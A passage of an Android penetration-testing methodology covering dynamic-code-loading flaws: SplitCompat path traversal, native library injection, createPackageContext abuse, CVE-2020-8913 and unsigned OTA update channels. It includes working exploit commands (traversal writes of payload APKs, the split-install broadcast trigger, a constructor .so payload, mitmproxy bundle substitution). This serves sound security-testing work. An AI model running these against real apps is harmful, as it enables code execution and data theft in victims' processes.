- **Proof:** The app loading your substituted artefact, evidenced by your marker under the victim's PID.
- **Escalation:** → D17-008. This variant is the highest-confidence one to report because the attacker
  precondition is a permission millions of apps already hold.
- **Ruled out when:** No executable artefact ever appears under external storage (verified with a
  `find /sdcard -newermt` sweep after a full walkthrough), **and** the manifest does not set
  `requestLegacyExternalStorage`.

### D17-012 · SplitCompat / `verified-splits` as the write target

| | |
|---|---|
| **Severity ceiling** | **Critical** |
| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) |
| **Attacker** | AM-03 |
| **Applies to** | apps using Play Feature Delivery / `SplitCompat` / dynamic feature modules |
| **Maps to** | Oversecured *"Why dynamic code loading could be dangerous for your apps: a Google example"* — "when a file in that folder starts with a `config.` prefix, it will be added to the app's runtime ClassLoader automatically"; path traversal `..%2Fsplitcompat%2F`; persistence "even after attacker app removal" |

- **Test:** Play Core's split-loading machinery adds any `config.`-prefixed file in the `verified-splits`
  directory to the app's runtime `ClassLoader` — and treats it as already verified. Check specifically
  whether *any* write primitive you hold reaches that directory.
- **How:**
  ```bash
  grep -rnE 'SplitCompat\.install|SplitInstallManager|SplitCompatApplication|setAllowedSplitTypes|local_testing' out/sources/
  adb shell run-as com.target.app sh -c 'find files -maxdepth 5 -path "*splitcompat*" -o -path "*local_testing*" -print'
  adb shell run-as com.target.app ls -laR files/splitcompat/ 2>/dev/null
  # aim any arbitrary-write primitive at that path
  adb shell content write --uri \
    'content://com.target.provider/..%2Fsplitcompat%2F<versionCode>%2Fverified-splits%2Fconfig.pwn.apk' < payload.apk
  ```
- **Proof:** Your APK present under
  `/data/user/0/com.target.app/files/splitcompat/<id>/verified-splits/config.<x>.apk`, and a class from it
  resolvable by the app — hook `ClassLoader.loadClass` to capture the resolution, or emit a marker from a
  static initialiser under the victim's PID.
- **Escalation:** Terminal, and persistent beyond the attacker app's uninstall — say so explicitly in the
  report.
- **Ruled out when:** The app does not use Play Feature Delivery (no `com.google.android.play.core*` classes,
  no `splitcompat` directory after a full walkthrough including a feature-module download), or the
  `verified-splits` path is unreachable by every write primitive you enumerated.

### D17-013 · Native library loaded from a writable path (`System.load` / `dlopen`)

| | |
|---|---|
| **Severity ceiling** | **Critical** |
| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) |
| **Attacker** | AM-03 |
| **Applies to** | all. Platform read-only enforcement for `System.load()` arrives at **targetSdk ≥ 37 (Android 17)** — below that there is no platform help at all. `android:extractNativeLibs` decides whether `lib-*/` even exists on disk |
| **Maps to** | MASWE-0049; MASTG-TECH-0041 (Library Injection); Google Mobile VRP ACE examples — "Overwriting a `.so` file with a malicious `.so` file that is executed by the victim app" |

- **Test:** `System.load()` takes an absolute path; `System.loadLibrary()` resolves against
  `nativeLibraryDir` and `lib-*/`. Either becomes execution if the resolved file is writable — and a
  `JNI_OnLoad`/`__attribute__((constructor))` runs before any Java code can intervene. Two sub-cases:
  a `.so` the app downloads into `files/`/`cache/`, and a packaged `.so` extracted into `lib-main`/`app_lib`
  that a traversal write can overwrite.
- **How:**
  ```bash
  grep -n 'android:extractNativeLibs' out/AndroidManifest.xml
  adb shell run-as com.target.app ls -la lib-main/ lib-1/ app_lib/ files/ cache/ 2>/dev/null
  grep -rnE 'System\.load\(|System\.loadLibrary\(|Runtime\.getRuntime\(\)\.load' -B6 out/sources/ \
    | grep -iE 'getFilesDir|getCacheDir|getDir\(|External|download'
  rabin2 -zz lib/*/*.so | grep -i dlopen
  frida-trace -U -f com.target.app -i "dlopen*" -i "android_dlopen_ext"
  adb shell "cat /proc/$(adb shell pidof com.target.app)/maps" | grep '\.so$' | grep -v '/data/app/'
  ```
  Payload whose constructor fires on load:
  ```c
  #include <android/log.h>
  #include <unistd.h>
  __attribute__((constructor)) void init(void) {
      __android_log_print(ANDROID_LOG_INFO, "PWNMARK7f3a91", "loaded uid=%d", getuid());
  }
  ```
  ```bash
  $NDK/toolchains/llvm/prebuilt/*/bin/aarch64-linux-android30-clang -shared -fPIC payload.c -o libpwn.so
  ```
- **Proof:** `adb logcat --pid=$(adb shell pidof com.target.app) | grep PWNMARK7f3a91` printing the
  **victim's** uid, plus `/proc/<pid>/maps` showing your `.so` mapped.
- **Escalation:** Native execution bypasses every Java-level RASP hook the app installs (→ D21) and reaches
  D16's memory-corruption surface directly.
- **Ruled out when:** `android:extractNativeLibs="false"` (the AGP 3.6+ default — libraries are mapped
  uncompressed from the signed APK and `lib-*/` does not exist), **and** no `System.load()` call takes a
  path outside `nativeLibraryDir`, **and** `dlopen` tracing shows no load outside `/data/app/`, `/system/`,
  `/vendor/` and `/apex/`. Check `extractNativeLibs` before claiming the `lib-main` primitive applies —
  on modern builds it does not.

### D17-014 · Android 17 native read-only enforcement as a locator, not a wall

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a |
| **Attacker** | n/a (tester step) |
| **Applies to** | targetSdk ≥ 34 (DEX/JAR/APK) and targetSdk ≥ 37 (native `System.load()`) |
| **Maps to** | HackTricks *insecure-in-app-update-rce* ("Platform changes that change exploitation"), citing Android's dynamic-code-loading risk documentation |

- **Test:** On a matching API level the platform throws when the app loads a writable dynamic artefact —
  `UnsatisfiedLinkError` for a writable copied `.so`, an exception for a writable DEX/JAR/APK. **The crash
  is not the finding.** It proves the app ships a custom updater or plugin architecture, and it tells you
  exactly where the load site is. Move one stage earlier and attack the metadata, the temp file, the unzip
  destination, or the decrypted buffer — before the app flips permissions or verifies anything.
- **How:**
  ```bash
  adb shell getprop ro.build.version.sdk
  adb logcat -c && adb shell monkey -p com.target.app 1
  adb logcat -d | grep -iE 'UnsatisfiedLinkError|not read-only|dex file .* is not read-only'
  ```
- **Proof:** The exception text, plus the stack frame naming the loader — that frame is your target for
  D17-004 / D17-033.
- **Escalation:** → whichever stage precedes the load.
- **Ruled out when:** No such exception on a device at the enforcing API level after a full walkthrough
  including an update check — which is consistent with either compliance or no dynamic loading; distinguish
  with D17-002.

### D17-015 · "Verified" in a name is not verification at load time

| | |
|---|---|
| **Severity ceiling** | High–Critical (it is the enabling half of a write→RCE chain) |
| **VRT** | `cryptographic_weakness.insecure_implementation.missing_cryptographic_step` (VARIES) for the control failure; `server_side_injection.remote_code_execution_rce` (P1) once chained |
| **Attacker** | AM-03 / AM-09 |
| **Applies to** | all apps with a module/plugin/split loader |
| **Maps to** | MASWE-0011 (Improper Verification of Cryptographic Signature); Play Core `verified-splits` naming; `risks/dynamic-code-loading` `FileIntegrityChecker` sample |

- **Test:** Directory names like `verified-splits`, method names like `unZipAndVerify`, and configuration
  keys with `SIGNATURE` in them are naming, not enforcement. Read the code path between the file read and
  the `ClassLoader` construction and find the actual check — or its absence. A download-time check is not a
  load-time check: anything that can write the file after the download defeats it.
- **How:**
  ```bash
  # find the loader, then read backwards from it
  grep -rnE 'new (DexClassLoader|PathClassLoader|InMemoryDexClassLoader)' -B40 out/sources/ \
    | grep -nE 'Signature\.verify|MessageDigest|checkSignature|verifySignature|PublicKey|KeyFactory|Base64\.decode'
  # and read the FAILURE branch — does it throw, or log and continue?
  ```
- **Proof:** Either (a) no verification call between the read and the loader construction — quote the
  decompiled method; or (b) a verification call whose failure branch does not throw (fails open). A worked
  positive for contrast: a DSA-verified `unZipAndVerify` that throws on mismatch **holds**, and belongs in
  the ruled-out register with the decompiled failure branch quoted.
- **Escalation:** → D17-008/D17-012/D17-013 to complete the chain; → D17-034 if the check exists but is
  not bound to a developer-held key.
- **Ruled out when:** A signature verification against a key **not present in the payload** runs
  immediately before the loader is constructed, and its failure branch throws rather than logs. Quote both.

### D17-016 · The SELinux gate — check `execute` before you write "RCE"

| | |
|---|---|
| **Severity ceiling** | Support (it decides whether the item above is Critical or a High write) |
| **VRT** | n/a |
| **Attacker** | n/a (tester step) |
| **Applies to** | all; the constraint bites from `untrusted_app_29` upwards |
| **Maps to** | AOSP SELinux policy for `untrusted_app` / `app_data_file`; the corpus's SELinux-downgrade discipline (D25) |

- **Test:** A write into an app-private directory is not automatically execution. From `untrusted_app_29`
  the domain is denied `execute` on `app_data_file`, which is why the modern chains land on a **DEX/JAR/APK
  loaded by the runtime** (no `execve`, no `mmap PROT_EXEC` by the app itself) or on a `.so` loaded by the
  linker, rather than on a dropped ELF the app `exec`s. Establish which of those you actually have before
  writing the severity paragraph.
- **How:**
  ```bash
  adb shell id -Z                                            # your own context
  adb shell "cat /proc/$(adb shell pidof com.target.app)/attr/current"
  adb shell ls -Z /data/data/com.target.app/files/
  adb shell dmesg | grep -i 'avc: denied' | tail -40
  adb logcat -b events -d | grep -i avc | tail -40
  ```
- **Proof:** Either a clean execution (your marker in logcat under the victim's PID, no AVC denial), or an
  `avc: denied { execute }` line that bounds the finding to an arbitrary write.
- **Escalation:** With a denial, file the write at its own severity (D07/D11) and the loader gap separately
  (D17-015), and say in both reports why the chain stops. That is a stronger report than an overclaimed
  Critical that a triager disproves.
- **Ruled out when:** Not applicable as a negative — this item exists to prevent an overclaim. Record the
  outcome either way.

### D17-017 · Prove the code ran under the VICTIM's UID, not yours

| | |
|---|---|
| **Severity ceiling** | Support (it is what makes every Critical in this chapter payable) |
| **VRT** | n/a |
| **Attacker** | n/a (tester step) |
| **Applies to** | every code-execution claim in this chapter |
| **Maps to** | Google Mobile VRP exclusion: *"Tricking a user into installing an app and executing code within that app itself does not qualify"* — the code must run in the **victim** app's process |

- **Test:** The single most common reason a Critical here gets downgraded is that the evidence shows the
  attacker's own process running attacker code. Every proof in this chapter must bind the execution to the
  target's UID, PID and package name.
- **How:** Make the payload self-identifying, then capture it three ways:
  ```java
  static {
    android.util.Log.i("PWNMARK7f3a91",
      "uid=" + android.os.Process.myUid() + " pid=" + android.os.Process.myPid());
  }
  ```
  ```bash
  TPID=$(adb shell pidof com.target.app)
  adb logcat --pid=$TPID | grep PWNMARK7f3a91          # 1. bound to the victim's PID
  adb shell run-as com.target.app ls -l files/pwn_marker # 2. a file written under the victim's UID
  adb shell "cat /proc/$TPID/maps" | grep pwn           # 3. your artefact mapped into the victim
  ```
  Capture the five-screenshot state-change pattern around it: pre-state (no marker file, app behaving
  normally), the exploit step, the negative post-state (a control run without the payload), the positive
  post-state (marker present under the victim's UID), and the side effect (whatever the code then reached —
  a token read, a private file exfiltrated).
- **Proof:** The three bindings above, timestamped, with `pidof` output in the same capture so the PID is
  not asserted.
- **Escalation:** n/a — this is the evidence standard.
- **Ruled out when:** n/a. If you cannot produce all three bindings, downgrade your own claim to "write
  primitive present, execution not demonstrated" and say so.

### D17-018 · Play Core version check — CVE-2020-8913, including the worked negative

| | |
|---|---|
| **Severity ceiling** | **Critical** if vulnerable and reachable; otherwise a recorded negative |
| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) when exploited; `using_components_with_known_vulnerabilities.outdated_software_version` (P5) if you file the version alone |
| **Attacker** | AM-03 |
| **Applies to** | apps bundling `com.google.android.play:core`. **LEGACY** for the library bug itself; the *shape* recurs in every module loader |
| **Maps to** | **CVE-2020-8913** — Play Core `< 1.7.2`, CVSS 8.8; Oversecured's analysis (unprotected runtime-registered receiver in `com/google/android/play/core/splitinstall/C3748l.java` and `com/google/android/play/core/listener/C3718a.java`; unvalidated `split_id` path traversal in `com/google/android/play/core/internal/ab.java`; base path `/data/user/0/{pkg}/files/splitcompat/{id}/unverified-splits/`; timeline: trigger 2020-02-26, exploit 2020-02-27, Google fix 2020-04-06, CVE assigned 2020-07-22); Play Core release notes **1.7.2 (March 2020)**; Check Point's characterisation (steal banking credentials and, with SMS permission, 2FA codes) |

- **Test:** Resolve the **actual** bundled version, not the coordinate. The monolithic
  `com.google.android.play:core` was deprecated in April 2022 and split into `app-update`,
  `asset-delivery`, `review`, `feature-delivery`; the 2.x rewrite is patched. An app still on the monolith
  is by definition unpatched against anything found since.
- **How:**
  ```bash
  unzip -p target.apk 'META-INF/*.version' | sort -u
  unzip -l target.apk | grep -iE 'play-core|play_core|splitcompat|feature-delivery'
  grep -rn 'com.google.android.play:core\|com.google.android.play:feature-delivery' --include='*.gradle*' --include='*.toml' .
  jadx -d out target.apk
  grep -rn 'com/google/android/play/core/splitcompat\|SplitInstallUpdateIntentService\|split_file_intents\|unverified-splits' out/sources/
  ```
- **Proof:** The resolved version string from `META-INF/*.version` or the release-notes mapping. **Worked
  negative from the corpus:** a `play:core` reference that resolved to **`feature-delivery 2.1.0`** → the
  2.x rewrite → **CVE-2020-8913 not applicable**. Write that sentence into the ruled-out register verbatim;
  it is worth more than a speculative finding.
- **Escalation:** If vulnerable, → D17-019 for the trigger and D17-012 for the landing.
- **Ruled out when:** The resolved artefact is `com.google.android.play:feature-delivery` (or any other 2.x
  coordinate), or the monolith at `≥ 1.7.2`, evidenced by the `META-INF/*.version` line.

### D17-019 · The dynamically-registered split-install receiver (invisible in the manifest)

| | |
|---|---|
| **Severity ceiling** | **Critical** |
| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) |
| **Attacker** | AM-03 |
| **Applies to** | apps bundling a vulnerable Play Core, and — as a *shape* — any update library that registers a receiver at runtime |
| **Maps to** | CVE-2020-8913; Oversecured Play Core analysis ("Attackers create malicious `Parcelable` objects containing code executed during deserialization via the `createFromParcel()` method") |

- **Test:** The receiver that made CVE-2020-8913 exploitable is **registered at runtime**, so it appears in
  no manifest and no `drozer app.package.attacksurface` output. It exists only while the app is
  foregrounded. Generalise the check: any update/module library that calls `registerReceiver` with an
  action string is an undocumented IPC entry point.
- **How:**
  ```bash
  # find runtime registrations the manifest does not show
  grep -rnE 'registerReceiver\(' -A6 out/sources/ | grep -viE '^out/sources/(android|androidx)/'
  adb shell dumpsys activity broadcasts | grep -A5 -i com.target.app | head -60
  # the CVE-2020-8913 trigger (target must be foregrounded)
  adb shell am start -n com.target.app/.MainActivity
  adb shell am broadcast \
    -a com.google.android.play.core.splitinstall.receiver.SplitInstallUpdateIntentService \
    -p com.target.app --es split_id "../verified-splits/config.test"
  adb shell run-as com.target.app ls -l files/splitcompat/*/verified-splits/
  ```
- **Proof:** A `config.<x>` file present under the app's `verified-splits` directory that your app wrote,
  plus your marker in logcat under the target's PID for the full chain.
- **Escalation:** → D17-012 landing, → D17-047/049 for the `Parcelable` stage of the original exploit.
- **Ruled out when:** `dumpsys activity broadcasts` shows no runtime-registered receiver belonging to the
  app's UID whose action is not also declared in the manifest, sampled while the app is foregrounded and
  during an update check.

### D17-020 · Post-install split delivery — test whether a modified split installs

| | |
|---|---|
| **Severity ceiling** | **Critical** if a modified split installs; otherwise Support (documents the post-install code surface was reviewed) |
| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) |
| **Attacker** | AM-03 / AM-11 |
| **Applies to** | AAB-distributed apps |
| **Maps to** | `guide/app-bundle/play-feature-delivery` — "App bundles are signed using signing configs from the base module only"; "Split APKs are verified by the Play Store before delivery"; `SplitInstallManager`, `SplitCompatApplication`, `dist:delivery`, `dist:removable` |

- **Test:** Feature modules are code delivered *after* install. The signing story rests entirely on the
  delivery channel, so test what the installer does with a split supplied out of band.
- **How:**
  ```bash
  adb install-multiple base.apk attacker_split.apk           # mismatched signature should fail
  SID=$(adb shell pm install-create -p com.target.app | grep -oE '[0-9]+')
  adb shell pm install-write -S $(stat -f%z split_x.apk) $SID split_x.apk /dev/stdin < split_x.apk
  adb shell pm install-commit $SID
  adb logcat -d | grep -iE 'INSTALL_FAILED|signature|split'
  ```
- **Proof:** The exact installer failure string (proves verification works — a positive control worth
  recording), or a successful side-load of a modified split, which is a serious finding: include the full
  install-session transcript.
- **Escalation:** → D21 (the same session is how a Frida gadget gets in); → D17-012 once your split's code
  is in the classloader.
- **Ruled out when:** `pm install-commit` returns `INSTALL_FAILED_INVALID_APK` /
  `INSTALL_PARSE_FAILED_NO_CERTIFICATES` / a signature mismatch for every modified split you tried,
  including one re-signed with your own key and one with the signature block stripped.

### D17-021 · `createPackageContext(CONTEXT_INCLUDE_CODE | CONTEXT_IGNORE_SECURITY)` with prefix-only matching

| | |
|---|---|
| **Severity ceiling** | **Critical** |
| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) |
| **Attacker** | AM-03 |
| **Applies to** | all. `targetSdk ≥ 30` package visibility makes the *victim's* enumeration of your package harder (it needs a `<queries>` entry, which conveniently makes the peer list auditable) but does **not** stop a targeted attack — the attacker app can still announce itself or be launched |
| **Maps to** | `risks/create-package-context` (MASVS-CODE) — attack prerequisites: both flags plus `getClassLoader()` on the target side, package-name claim plus exported `android:appComponentFactory` on the attacker side; remediation `packageManager.checkSignatures(packageName, context.getPackageName())`; Oversecured *"Android: arbitrary code execution via third-party package contexts"* — **"at least one in every 50 popular apps"**; MASWE-0049; "My Other ClassLoader is Your ClassLoader" (Nullcon Berlin 2025 / No Hat 2024, Dimitrios Valsamaras) |

- **Test:** Plugin, theme, filter, font and "companion app" architectures load code from a package
  identified by **name**. A name is not a signature. If the app prefix-matches (`startsWith("com.victim.module.")`)
  or accepts a name that is simply absent from the device, an attacker publishes a package claiming it and
  executes code inside the victim's process.
- **How:**
  ```bash
  grep -rn 'createPackageContext(' -B10 -A15 out/sources/
  grep -rnE 'CONTEXT_INCLUDE_CODE|CONTEXT_IGNORE_SECURITY|getClassLoader\(\)' out/sources/
  grep -rnE 'getInstalledPackages|getInstalledApplications' -A10 out/sources/ | grep -nE 'startsWith|contains|equals'
  grep -rn 'checkSignatures(' out/sources/          # presence is the mitigation; absence is the finding
  grep -n '<queries>' -A20 out/AndroidManifest.xml  # the auditable peer list on targetSdk 30+
  ```
  The vulnerable shape to quote in the report:
  ```java
  if (packageName.startsWith("com.victim.module.")) { processModule(context, packageName); }
  Context appContext = context.createPackageContext(packageName,
      Context.CONTEXT_INCLUDE_CODE | Context.CONTEXT_IGNORE_SECURITY);
  appContext.getClassLoader().loadClass("com.victim.MainInterface").getMethod("getInterface").invoke(null);
  ```
  PoC app: package name `com.victim.module.pwn7f3a91`, exporting the expected entry class/method, and/or
  declaring `android:appComponentFactory` pointing at your class so the loader instantiates it for you.
- **Proof:** Your class's static initialiser logging from inside the target's process:
  `adb logcat --pid=$(adb shell pidof com.target.app) | grep PWNMARK7f3a91`, with
  `Context.getPackageName()` returning the **victim's** package, or a file written into the victim's
  `filesDir` by your code.
- **Escalation:** Total app compromise — every secret the app holds, its Keystore handles, its network
  session. Persistent.
- **Ruled out when:** No `createPackageContext` call exists; or every call passes an **exact** package name
  and is preceded by `checkSignatures(...) == SIGNATURE_MATCH` (or `hasSigningCertificate` with a pinned
  digest) whose failure branch aborts. Quote the check and its failure branch.

### D17-022 · `checkSignatures` present but satisfiable — rotation and historical certificates

| | |
|---|---|
| **Severity ceiling** | Medium standalone; it is a hard prerequisite break for the D17-021 fix |
| **VRT** | `cryptographic_weakness.insecure_implementation.improper_following_of_specification` (VARIES) |
| **Attacker** | AM-03 |
| **Applies to** | apps using APK Signature Scheme v3 key rotation; `GET_SIGNING_CERTIFICATES` exists from **API 28** |
| **Maps to** | MASWE-0011 (Improper Verification of Cryptographic Signature) |

- **Test:** The documented fix for D17-021 is a signature comparison. Test that the comparison is actually
  binding: code that trusts `getSigningCertificateHistory()`, or that passes `PackageManager.CERT_INPUT_SHA256`
  against a *historical* certificate, accepts any peer that once held the old key. Test both directions —
  does a legitimately rotated peer still pass, and can an attacker satisfy the check?
- **How:**
  ```bash
  apksigner verify --print-certs --verbose base.apk
  grep -rnE 'checkSignatures|GET_SIGNATURES|GET_SIGNING_CERTIFICATES|getApkContentsSigners|getSigningCertificateHistory|hasSigningCertificate|CERT_INPUT_SHA256' out/sources/ -A8
  ```
- **Proof:** The decompiled comparison using `getSigningCertificateHistory()` or comparing against a
  hardcoded digest that appears in a published older release of the peer app.
- **Escalation:** → D17-021 becomes exploitable again despite the apparent fix; → D02 for the signing-scheme
  analysis; → D06 for package-name authentication on bound services.
- **Ruled out when:** The check uses `getApkContentsSigners()` (the current signer set) or
  `hasSigningCertificate(..., CERT_INPUT_SHA256)` against a digest that matches only the current signing
  certificate, and rejects on mismatch.

### D17-023 · `RemoteViews` / `ApplicationInfo` — objects that carry paths to code through IPC

| | |
|---|---|
| **Severity ceiling** | **Critical** |
| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) |
| **Attacker** | AM-04 (requires `POST_NOTIFICATIONS` in the disclosed case) |
| **Applies to** | apps that accept `RemoteViews` from another process (widget hosts, notification listeners, autofill services) or call `createPackageContext` with `CONTEXT_INCLUDE_CODE` |
| **Maps to** | **CVE-2025-22441** — installed app → SystemUI; `aInfo.createTimestamp` attacker-settable, pinning `updateApplicationInfo()`; a `<WebView>` injected into SystemUI's `SlicePermissionActivity` layout; the RemoteViews application stalled via a slow ContentProvider image load while racing `getContextForResourcesEnsuringCorrectCachedApkPaths()` with `mDefaultClassLoader` null; requires `POST_NOTIFICATIONS`; fixed August 2025. `risks/create-package-context` |

- **Test:** A less-known but generalisable shape: `RemoteViews` embeds a serialized `ApplicationInfo` from a
  remote process, and applying it calls `LoadedApk.checkAndUpdateApkPaths()`, which mutates global process
  state without checking that the named package is installed. In an app assessment the transferable check is
  the same: does this app take a *path to code or resources* from an untrusted sender?
- **How:**
  ```bash
  grep -rnE 'RemoteViews|ApplicationInfo|sourceDir|publicSourceDir|createPackageContext|CONTEXT_INCLUDE_CODE|CONTEXT_IGNORE_SECURITY' out/sources/ -A6
  grep -rnE 'setImageViewUri|setRemoteAdapter|apply\(|reapply\(' out/sources/
  grep -n 'android.permission.BIND_APPWIDGET\|BIND_NOTIFICATION_LISTENER_SERVICE\|BIND_AUTOFILL' out/AndroidManifest.xml
  ```
- **Proof:** The consuming process loading resources or code from a path you supplied — confirm with
  `Process.enumerateModules()` in a Frida session attached to the consumer, or by rendering an
  attacker-controlled layout inside the victim's UI.
- **Escalation:** Code execution in a more privileged process; on a system consumer this is a platform
  finding and belongs in the OEM/platform VRP as well as the app programme.
- **Ruled out when:** The app neither hosts `RemoteViews` from other packages nor constructs a Context from
  a package name it did not hardcode and signature-check.

### D17-024 · SDK Runtime — `<uses-sdk-library>` without a pinned `certDigest`, and secrets crossing the boundary

| | |
|---|---|
| **Severity ceiling** | Medium–High |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_internal_asset` (P3) for the secret hand-off; `cryptographic_weakness.insecure_implementation.missing_cryptographic_step` (VARIES) for the unpinned identity |
| **Attacker** | AM-08 |
| **Applies to** | Android 14+ for the SDK Runtime environment (incorporated into Privacy Sandbox on Android 16) |
| **Maps to** | `privacysandbox.google.com/private-advertising/sdk-runtime` — separate SDK Runtime process, "No app data access", "Permission limitations", "File access constraints", "IPC restrictions", "Activity access: Controlled through `SdkSandboxActivityHandler`"; `SdkSandboxManager`, `loadSdk()`, `SandboxedSdkProvider`, `SdkSandboxController`, `<uses-sdk-library>`, `certDigest`; `about/versions/16/features` |

- **Test:** The SDK Runtime moves a runtime-enabled SDK into a separate process with no access to the app's
  data directory. Two testable questions survive that: (1) does the app hand secrets across the boundary
  anyway, defeating the point; (2) is the SDK's identity pinned by `certDigest`?
- **How:**
  ```bash
  grep -n -A3 'uses-sdk-library' out/AndroidManifest.xml     # android:certDigest present and non-placeholder?
  grep -rnE 'SdkSandboxManager|loadSdk|SandboxedSdkProvider|SdkSandboxController|SdkSandboxActivityHandler' out/sources/
  adb shell ps -A | grep sdk_sandbox
  adb shell dumpsys sdk_sandbox 2>/dev/null
  ```
  ```javascript
  Java.perform(function () {
    var M = Java.use('android.app.sdksandbox.SdkSandboxManager');
    M.loadSdk.overloads.forEach(function (o) {
      o.implementation = function () {
        console.log('[loadSdk] ' + Array.prototype.slice.call(arguments).map(String).join(' | '));
        return o.apply(this, arguments);
      };
    });
  });
  ```
- **Proof:** A `loadSdk()` call whose params `Bundle` carries a user identifier or an auth token (print the
  bundle from the hook), or a `<uses-sdk-library>` with an absent or placeholder `certDigest`.
- **Escalation:** → D18 (third-party data flow), → D20 (undisclosed sharing).
- **Ruled out when:** No `<uses-sdk-library>` declaration and no `SdkSandboxManager` reference; or every
  declaration carries a concrete `certDigest` and the hooked `loadSdk` bundles carry no identifier or
  credential.

### D17-025 · Detect the OTA / plugin channel at all, and where it points

| | |
|---|---|
| **Severity ceiling** | Low standalone — but it is the precondition for every Critical below, and it changes what "the app" means |
| **VRT** | `insecure_data_transport.executable_download.secure_integrity_check` (P5) if the channel is verified; `…no_secure_integrity_check` (P4) if not |
| **Attacker** | n/a for the discovery step |
| **Applies to** | all |
| **Maps to** | CodePush `docs/setup-android.md` (`strings.xml` `CodePushDeploymentKey`; `MainApplication.getJSBundleFile()` override); `CodePush.java` (`getCustomPropertyFromStringsIfExist("PublicKey")`/`("ServerUrl")`, default `mServerUrl = "https://codepush.appcenter.ms/"`); expo `UpdatesConfiguration.kt`; HackTricks *insecure-in-app-update-rce* ("Quick triage: does the app have an in-app updater?") |

- **Test:** Establish that a post-install code channel exists and where it points, before testing anything
  about it. This must be stated in the report's methodology section regardless of outcome.
- **How:**
  ```bash
  # CodePush
  grep -nE 'CodePushDeploymentKey|CodePushServerUrl|CodePushPublicKey' out/res/values/strings.xml
  grep -rn 'com.microsoft.codepush.react.CodePush' out/sources/ | head
  # expo-updates
  grep -nE 'expo\.modules\.updates\.' out/AndroidManifest.xml
  # Cordova / Capacitor live update
  grep -rniE 'hot.?code.?push|live.?update|appflow|ionic-deploy|updateUrl|channel' \
    out/res/xml/config.xml out/assets/capacitor.config.json out/assets/www/cordova_plugins.js 2>/dev/null
  # generic custom updater: strings and endpoints
  grep -rniE 'update|plugin|patch|upgrade|hotfix|bundle|feature|splitcompat|splitinstall|appUpdate|local-testing|tinker' out/sources/ \
    | grep -iE 'http|download|endpoint' | head -40
  # anything the search above missed
  grep -rnE 'DexClassLoader|PathClassLoader|InMemoryDexClassLoader|loadScriptFromFile' out/sources/ | head
  ```
- **Proof:** A deployment key plus a server URL in `strings.xml`, or `expo.modules.updates.EXPO_UPDATE_URL`
  in the manifest, plus a `getJSBundleFile()` override returning `CodePush.getJSBundleFile()`; or the
  update endpoint observed in the proxy.
- **Escalation:** → D17-026 through D17-036.
- **Ruled out when:** None of the greps hit, the proxy shows no request whose response is a bundle, archive
  or executable for any `Content-Type`, and `D17-002`'s runtime trace shows no load outside `/data/app/`.

### D17-026 · expo-updates with no code-signing certificate, or `ALLOW_UNSIGNED_MANIFESTS=true`

| | |
|---|---|
| **Severity ceiling** | **Critical** |
| **VRT** | `server_side_injection.remote_code_execution_rce` (P1); baseline `insecure_data_transport.executable_download.no_secure_integrity_check` (P4) — override with the execution proof |
| **Attacker** | AM-09 (update host / CDN / EAS itself) and AM-06 where TLS is the only control (see D14) |
| **Applies to** | Expo and bare RN apps using expo-updates |
| **Maps to** | expo `UpdatesConfiguration.kt` meta-data keys `expo.modules.updates.CODE_SIGNING_CERTIFICATE`, `CODE_SIGNING_METADATA`, `CODE_SIGNING_INCLUDE_MANIFEST_RESPONSE_CERTIFICATE_CHAIN`, `CODE_SIGNING_ALLOW_UNSIGNED_MANIFESTS`, `EXPO_UPDATE_URL`, `EXPO_RUNTIME_VERSION`, `EXPO_UPDATES_CHECK_ON_LAUNCH`, `ENABLE_EXPO_UPDATES_PROTOCOL_V0_COMPATIBILITY_MODE`, `DISABLE_ANTI_BRICKING_MEASURES`, `UpdatesController.overrideConfiguration()`; Expo code-signing docs ("the update is verified against the embedded certificate and included signature … rejected otherwise"; without it "ISPs, CDNs, cloud providers, and even EAS itself" could tamper); HackerOne's guidance on the class at `hackerone.com/blog/ensuring-mobile-application-security-expo` |

- **Test:** expo-updates verifies an update **only** when a code-signing certificate is configured. If
  `CODE_SIGNING_CERTIFICATE` is absent, or `CODE_SIGNING_ALLOW_UNSIGNED_MANIFESTS` is `true`, the only thing
  protecting the app's executable code is TLS to the update host.
- **How:**
  ```bash
  grep -nE 'expo\.modules\.updates\.(CODE_SIGNING_CERTIFICATE|CODE_SIGNING_ALLOW_UNSIGNED_MANIFESTS|CODE_SIGNING_METADATA|CODE_SIGNING_INCLUDE_MANIFEST_RESPONSE_CERTIFICATE_CHAIN)' out/AndroidManifest.xml
  grep -nE 'expo\.modules\.updates\.(EXPO_UPDATE_URL|EXPO_RUNTIME_VERSION|EXPO_UPDATES_CHECK_ON_LAUNCH|DISABLE_ANTI_BRICKING_MEASURES)' out/AndroidManifest.xml
  adb shell "run-as com.target.app ls -laR files/.expo-internal/"
  adb shell "run-as com.target.app cat shared_prefs/dev.expo.updates.prefs.xml"
  # then redirect the manifest request to a host you control and serve your own bundle
  mitmproxy --set block_global=false -s redirect_expo.py
  adb shell am force-stop com.target.app && adb shell monkey -p com.target.app 1
  ```
- **Proof:** Your bundle executing in the victim app after nothing but a restart and with no reinstall —
  a new screen, a marker in logcat, or an outbound beacon from the app's process. Use an 8+ character random
  marker (`PWNMARK7f3a91`), and grep the **baseline** bundle for that marker first so the proof is not a
  collision.
- **Escalation:** Steal every user's session (D13), read local storage (D11), reach every native module the
  RN bridge exposes (D10/D19). Affects every installed device on that channel.
- **Ruled out when:** `CODE_SIGNING_CERTIFICATE` is present, `CODE_SIGNING_ALLOW_UNSIGNED_MANIFESTS` is
  absent or `false`, and a manifest served with a broken signature is **rejected** — demonstrate the
  rejection, do not infer it from the config key. A config key without an enforcement test is not a
  ruled-out.

### D17-027 · CodePush without `CodePushPublicKey` — no bundle signature verification

| | |
|---|---|
| **Severity ceiling** | **Critical** |
| **VRT** | `server_side_injection.remote_code_execution_rce` (P1); baseline `insecure_data_transport.executable_download.no_secure_integrity_check` (P4) |
| **Attacker** | AM-09 / AM-06 |
| **Applies to** | React Native + react-native-code-push |
